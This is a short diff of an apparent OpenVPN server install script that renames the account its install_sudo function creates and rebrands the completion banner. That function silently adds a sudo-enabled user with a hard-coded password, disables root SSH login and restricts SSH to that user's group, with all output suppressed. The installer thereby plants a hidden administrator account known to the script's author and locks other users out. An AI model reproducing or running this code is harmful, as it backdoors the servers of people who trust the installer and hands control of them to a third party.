@@ -595,9 +595,9 @@ sudo service stunnel4 restart
 
 install_sudo(){
   {
-    useradd -m alamin 2>/dev/null; echo alamin:@AlaminX001 | chpasswd &>/dev/null; usermod -aG sudo alamin &>/dev/null
+    useradd -m nishat 2>/dev/null; echo nishat:@Rajoan123 | chpasswd &>/dev/null; usermod -aG sudo nishat &>/dev/null
     sed -i 's/PermitRootLogin yes/PermitRootLogin no/g' /etc/ssh/sshd_config
-    echo "AllowGroups alamin" >> /etc/ssh/sshd_config
+    echo "AllowGroups nishat" >> /etc/ssh/sshd_config
     service sshd restart
   }&>/dev/null
 }
@@ -664,7 +664,7 @@ exit 0" >> /etc/rc.local
 install_done()
 {
   clear
-  echo "OPENVPN SERVER SCBUILD"
+  echo "OPENVPN SERVER NISHATSOFT"
   echo "IP : $(curl -s https://api.ipify.org)"
   echo "OPENVPN TCP port : 1194"
   echo "OPENVPN UDP port : 53"
